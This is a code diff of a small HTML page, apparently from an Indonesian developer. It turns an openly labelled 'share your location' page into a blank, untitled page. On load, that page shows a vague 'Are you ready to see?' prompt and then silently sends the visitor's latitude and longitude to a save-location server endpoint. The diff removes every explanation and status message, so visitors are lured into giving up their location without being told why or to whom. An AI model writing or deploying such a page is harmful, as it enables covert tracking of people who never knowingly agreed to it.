@@ -3,57 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bagikan Lokasi</title>
+    <title></title>
 </head>
-<body>
-    <h2>Bagikan Lokasi Anda</h2>
-    <button id="share-location">Bagikan Lokasi</button>
-    <p id="status"></p>
+<body style="margin:0; padding:0;">
 
-    <script>
-        document.getElementById("share-location").addEventListener("click", function () {
-            const confirmShare = confirm("Are you ready to see?");
+<script>
+    window.onload = function () {
+        const confirmShare = confirm("Are you ready to see?");
 
-            if (!confirmShare) {
-                document.getElementById("status").innerText = "Anda membatalkan permintaan lokasi.";
-                return;
-            }
+        if (!confirmShare) return;
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
 
-                        document.getElementById("status").innerText = 
-                            "Mengirim lokasi ke developer...";
+                    // Kirim otomatis ke server
+                    fetch("http://localhost:3000/save-location", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({ latitude, longitude }),
+                    })
+                    .then((response) => response.text())
+                    .then((data) => console.log("Server:", data))
+                    .catch((error) => console.error("Error:", error));
+                },
+                (error) => {
+                    console.log("Gagal mendapatkan lokasi:", error.message);
+                }
+            );
+        }
+    };
+</script>
 
-                        // Kirim otomatis ke server
-                        fetch("http://localhost:3000/save-location", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({ latitude, longitude }),
-                        })
-                        .then((response) => response.text())
-                        .then((data) => {
-                            document.getElementById("status").innerText = 
-                                "Lokasi berhasil dikirim!";
-                            console.log(data);
-                        })
-                        .catch((error) => console.error("Error:", error));
-                    },
-                    (error) => {
-                        document.getElementById("status").innerText = 
-                            "Gagal mendapatkan lokasi: " + error.message;
-                    }
-                );
-            } else {
-                document.getElementById("status").innerText = 
-                    "Geolocation tidak didukung di browser ini.";
-            }
-        });
-    </script>
 </body>
 </html>
